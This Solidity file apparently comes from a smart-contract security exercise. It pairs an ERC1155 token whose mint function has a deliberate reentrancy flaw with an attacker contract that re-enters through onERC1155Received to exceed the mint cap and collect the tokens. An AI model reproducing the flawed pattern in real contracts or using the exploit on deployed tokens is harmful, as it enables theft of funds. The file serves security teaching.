// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

contract Overmint1_ERC1155_Attacker {
    Overmint1_ERC1155 public victim;
    address attacker;

    constructor(address victimContract) {
        victim = Overmint1_ERC1155(victimContract);
        attacker = msg.sender;
    }

    function attack() external {
        victim.mint(0, "");
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        require(msg.sender == address(victim), "not victim");

        uint256 balance = victim.balanceOf(address(this), id);

        if (balance < 5) {
            victim.mint(id, "");
        } else {
            victim.safeTransferFrom(address(this), attacker, id, balance, "");
        }

        return this.onERC1155Received.selector;
    }
}
